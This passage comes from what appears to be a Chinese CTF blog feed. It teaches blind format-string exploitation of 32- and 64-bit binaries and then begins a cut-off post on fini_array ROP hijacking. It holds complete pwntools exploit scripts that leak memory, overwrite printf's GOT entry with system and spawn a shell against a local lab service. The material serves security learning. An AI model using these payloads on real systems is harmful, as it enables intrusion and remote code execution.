data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-Z6eK911DhQLF67iW.png"></p><p>找到 main 函数在 0x0804860B ，需要将这部分定义为函数才能反编译，右键地址隔壁的名称 loc_804860B ，creat function 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-7UJQNJKfvUPjVkZT.png"></p><p>红色部分就是没有泄露出来的函数，后面跟的就是函数 plt 地址。</p><p>两种方法各有不同，结合实际使用。</p><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>着重记录<strong>格式化字符串盲打</strong>，不一步一步分析这道题目漏洞（详细分析：<a href="https://momomoxiaoxi.com/2017/12/26/Blindfmtstr/">默小西</a>博客）。这道题目思路是：</p><ol><li>确定 printf 的 plt 地址</li><li>通过泄露 plt 表中的指令内容确定对应的 got.plt 表地址</li><li>通过泄露的 got.plt 表地址泄露 printf 函数的地址</li><li>通过泄露的 printf 的函数地址确定 libc 基址，从而获得 system 地址</li><li>使用格式化字符串的任意写功能将 printf 的 got.plt 表中的地址修改为 system 的地址</li><li>send 字符串 “/bin/sh” ，那么在调用 printf(“/bin/sh”) 的时候实际上调用的是 system(“/bin/sh;”) ，从而成功获取shell</li></ol><h4 id="确定-printf-的-plt-地址"><a href="#确定-printf-的-plt-地址" class="headerlink" title="确定 printf 的 plt 地址"></a>确定 printf 的 plt 地址</h4><p>将泄露出来的程序，放入 ida 中分析获得，函数名后半截就是地址 0x8048490 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200626231225.png"></p><h4 id="泄露-got-plt"><a href="#泄露-got-plt" class="headerlink" title="泄露 got.plt"></a>泄露 got.plt</h4><p>和泄露程序 payload 高度相似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># \xff\x25 junk code</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:\xff\x25&#x27;</span>)</span><br><span class="line">printf_got_plt = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><strong>注解：</strong></p><p>为什么接收 ‘right:\xff\x25’ ？</p><p>right: 是固定回显，\xff\x25 是无用字节码。实际上 0x8048490 的汇编是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> pdisass 0x8048490</span> </span><br><span class="line"> ► 0x8048490 &lt;printf@plt&gt;       jmp    dword ptr [0x804a018] &lt;0xf7e4d670&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048496 &lt;printf@plt+6&gt;     push   0x18</span><br><span class="line">   0x804849b &lt;printf@plt+11&gt;    jmp    0x8048450</span><br><span class="line"><span class="meta">#</span><span class="bash"> 字节码</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20wx 0x8048490</span></span><br><span class="line">0x8048490 &lt;printf@plt&gt;:0xa01825ff0x186808040xe90000000xffffffb0</span><br></pre></td></tr></table></figure><p>0x8048490 指向是一条跳转 got.plt 指令，我们需要其中跳转的目标地址。\xff\x25 就是跳转指令的字节码，我们就要先接收 2 字节垃圾数据，然后再接收 4 字节的 got.plt 地址。</p><h4 id="泄露-printf-函数的地址"><a href="#泄露-printf-函数的地址" class="headerlink" title="泄露 printf 函数的地址"></a>泄露 printf 函数的地址</h4><p>构造方法同上，但不需要接收 2 字节垃圾数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_got_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">printf_got = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h4 id="泄露-libc-基址-amp-system-地址"><a href="#泄露-libc-基址-amp-system-地址" class="headerlink" title="泄露 libc 基址&amp; system 地址"></a>泄露 libc 基址&amp; system 地址</h4><p>题目没有给出 libc 。从泄露出来的 printf@got 去 libcdatabase 查询其他函数偏移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf:0x00049670</span><br><span class="line">system:0x0003ada0</span><br></pre></td></tr></table></figure><h4 id="任意写修改-112-x72-x69-x6e-x74-102-x40-103-x6f-x74-x2e-112-108-x74"><a href="#任意写修改-112-x72-x69-x6e-x74-102-x40-103-x6f-x74-x2e-112-108-x74" class="headerlink" title="任意写修改 &#112;&#x72;&#x69;&#x6e;&#x74;&#102;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;"></a>任意写修改 <a href="mailto:&#112;&#x72;&#x69;&#x6e;&#x74;&#102;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;">&#112;&#x72;&#x69;&#x6e;&#x74;&#102;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got_plt: system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : leakmemory_remote.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p32(addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    resp = p.recvuntil(<span class="string">&quot;.TMP&quot;</span>)</span><br><span class="line">    ret = resp[:-<span class="number">4</span>:]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = p.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x8048490</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf@got.plt</span></span><br><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># \xff\x25 junk code</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:\xff\x25&#x27;</span>)</span><br><span class="line">printf_got_plt = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;printf_got_plt:&quot;</span>+<span class="built_in">hex</span>(printf_got_plt))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf@got</span></span><br><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_got_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">printf_got = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcdatabase</span></span><br><span class="line">libc_base = printf_got - <span class="number">0x00049670</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + <span class="number">0x0003ada0</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got_plt: system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="64-位利用手法"><a href="#64-位利用手法" class="headerlink" title="64 位利用手法"></a>64 位利用手法</h2><h3 id="实验环境准备-1"><a href="#实验环境准备-1" class="headerlink" title="实验环境准备"></a>实验环境准备</h3><p>还是使用 32 位的例题源码，编译 64 位程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c</span><br></pre></td></tr></table></figure><p>用 socat 挂到端口 10001 上部署：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10000,fork EXEC:./leakmemory</span><br></pre></td></tr></table></figure><p>实验环境完成，如果是本地部署的话，等等在 exp 里面写 remote(“127.0.0.1”,10000) 模拟没有 binary 的远程盲打。</p><h3 id="确定程序的位数-1"><a href="#确定程序的位数-1" class="headerlink" title="确定程序的位数"></a>确定程序的位数</h3><p>填充 8 字节，然后再填入 %p  ，回显长度是 8 字节。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627113511.png"></p><h3 id="确定格式化字符串偏移-1"><a href="#确定格式化字符串偏移-1" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h3><p>最后确认偏移为 8 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-2r7Ig0pKhjZRYcl3.png"></p><h3 id="dump-程序-1"><a href="#dump-程序-1" class="headerlink" title="dump 程序"></a>dump 程序</h3><p>从程序加载地方开始，或者从 text 段开始可以的。这里不再找 text 段起始位置，直接从程序加载地方开始泄露。两个位数程序脚本通用的，改一下参数即可。</p><p><strong>64 位程序加载起始地址是：0x400000</strong>，下面是对比图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-CTSvll4wMcTxU1DR.png"></p><p>脚本还是那个脚本，改一下参数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span> </span><br><span class="line"><span class="comment">#r = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot;.TMP&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;moxiaoxi&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">begin = <span class="number">0x400000</span><span class="comment">#0x8048000</span></span><br><span class="line">text_seg =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret = leak(begin)</span><br><span class="line">        text_seg += ret</span><br><span class="line">        begin += <span class="built_in">len</span>(ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret) == <span class="number">0</span>:   <span class="comment"># nil</span></span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            text_seg += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(text_seg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin_64&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text_seg)</span><br></pre></td></tr></table></figure><p>ida 加载参数如图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627120919.png"></p><p>通过字符串定位到 main 函数，这里没有识别为函数，需要手动创建函数。在 0x0400826 右键 creat function ，然后就可以反汇编了。</p><p>点进 printf@plt ，里面是跳转到 <a href="mailto:&#x70;&#x72;&#105;&#110;&#116;&#102;&#64;&#x67;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;">&#x70;&#x72;&#105;&#110;&#116;&#102;&#64;&#x67;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;</a> 指令，也就是从 ida 知道了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf_plt &#x3D; 0x4006B0</span><br><span class="line">printf_got_plt &#x3D; 0x601030</span><br></pre></td></tr></table></figure><p>解题思路与 32 位一致，利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : leakmemory_64_remote.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p64(addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    resp = p.recvuntil(<span class="string">&quot;.TMP&quot;</span>)</span><br><span class="line">    ret = resp[:-<span class="number">4</span>:]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = p.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x4006B0</span></span><br><span class="line">printf_got_plt = <span class="number">0x601030</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;moxiaoxi&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf@got</span></span><br><span class="line">payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p64(printf_got_plt+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">printf_got = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;\x00&#x27;</span>)&lt;&lt;<span class="number">8</span></span><br><span class="line">log.info(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcdatabase</span></span><br><span class="line">libc_base = printf_got - <span class="number">0x055800</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + <span class="number">0x045390</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">one = p64(system_addr)[:<span class="number">2</span>]</span><br><span class="line">two = p64(system_addr&gt;&gt;<span class="number">16</span>)[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%9104c%12$hn%54293c%13$hn&quot;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line">payload += p64(printf_got_plt) + p64(printf_got_plt+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="更多实例"><a href="#更多实例" class="headerlink" title="更多实例"></a>更多实例</h2><ul><li><p>axb_2019_fmt32</p><p>BUU 上有实验环境，忽略提供的二进制文件，就是盲打题目</p></li><li><p>axb_2019_fmt64</p><p>BUU 上有实验环境，忽略提供的二进制文件，就是盲打题目</p></li><li><p>SuCTF2018 - lock2 </p><p>主办方提供了 docker 镜像: suctf/2018-pwn-lock2</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh">ctf-wiki</a></li><li><a href="https://momomoxiaoxi.com/2017/12/26/Blindfmtstr/">leak me</a></li><li><a href="https://luobuming.github.io/2019/10/17/2019-10-17-pwn-%E7%9B%B2%E6%89%93/#64%E4%BD%8D%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95">pwn-盲打</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 合天 </tag>
            
            <tag> Blind_pwn </tag>
            
            <tag> 格式化字符串盲打 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持64位静态程序fini_array进行ROP攻击</title>
      <link href="archives/2a024eda/"/>
      <url>archives/2a024eda/</url>
      
        <content type="html"><![CDATA[<p>[scode type=”lblue”]2020年8月6日 标题添加“静态程序”，补充与 64 位动态程序对比和利用方法差异小结[/scode]</p><h2 id="程序起点"><a href="#程序起点" class="headerlink" title="程序起点"></a>程序起点</h2><p>程序的启动流程如图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-gAfdEK02MtTbddaQ.png"></p><p>可以看到 main 函数不是程序起点，之前写的 格式化字符串盲打 也分析过 text 段起点是 _start 函数 。_start 函数调用__libc_start_main 完成启动和退出工作。具体看看 _start 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A60                 <span class="keyword">public</span> start</span><br><span class="line">.text:<span class="number">0000000000401</span>A60 start           proc near               ; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401</span>A60 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401</span>A60                 <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">.text:<span class="number">0000000000401</span>A62                 mov     r9, rdx</span><br><span class="line">.text:<span class="number">0000000000401</span>A65                 pop     rsi</span><br><span class="line">.text:<span class="number">0000000000401</span>A66                 mov     rdx, rsp</span><br><span class="line">.text:<span class="number">0000000000401</span>A69                 <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line">.text:<span class="number">0000000000401</span>A6D                 push    rax</span><br><span class="line">.text:<span class="number">0000000000401</span>A6E                 push    rsp</span><br><span class="line"><span class="comment">// 以此将 fini、init、main 地址压入寄存器</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.text:<span class="number">0000000000401</span>A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.text:<span class="number">0000000000401</span>A7D                 mov     rdi, offset main</span><br><span class="line">.text:<span class="number">0000000000401</span>A84                 db      <span class="number">67</span>h</span><br><span class="line">.text:<span class="number">0000000000401</span>A84                 call    __libc_start_main</span><br><span class="line">.text:<span class="number">0000000000401</span>A8A                 hlt</span><br><span class="line">.text:<span class="number">0000000000401</span>A8A ; &#125; <span class="comment">// starts at 401A60</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A8A start           endp</span><br></pre></td></tr></table></figure><p><a href="https://refspecs.linuxfoundation.org/LSB_4.0.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">__libc_start_main 定义原型</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **), <span class="keyword">int</span> argc, <span class="keyword">char</span> ** ubp_av, <span class="keyword">void</span> (*init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*stack_end));</span><br></pre></td></tr></table></figure><p>根据 64 位传参特定得出对应寄存器值。这个执行顺序我是通过调试得出来的。（__libc_csu_init 的话是 ret2csu 利用对象。）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi &lt;- main</span><br><span class="line">rcx &lt;- __libc_csu_init    <span class="comment">//在main函数前执行</span></span><br><span class="line">r8 &lt;- __libc_csu_fini    <span class="comment">//在main函数后执行</span></span><br></pre></td></tr></table></figure><h2 id="libc-csu-fini-函数"><a href="#libc-csu-fini-函数" class="headerlink" title="__libc_csu_fini 函数"></a>__libc_csu_fini 函数</h2><p>__libc_csu_fini 函数是 main 函数退出返回到 __libc_start_main 后，通过 __libc_start_main 调用的。具体看看函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000402960</span> __libc_csu_fini proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:<span class="number">0000000000402960</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000402960</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000402961</span>                 lea     rax, unk_4B4100</span><br><span class="line">.text:<span class="number">0000000000402968</span>                 lea     rbp, _fini_array_0</span><br><span class="line">.text:<span class="number">000000000040296F</span>                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000402970</span>                 sub     rax, rbp</span><br><span class="line">.text:<span class="number">0000000000402973</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000402977</span>                 sar     rax, <span 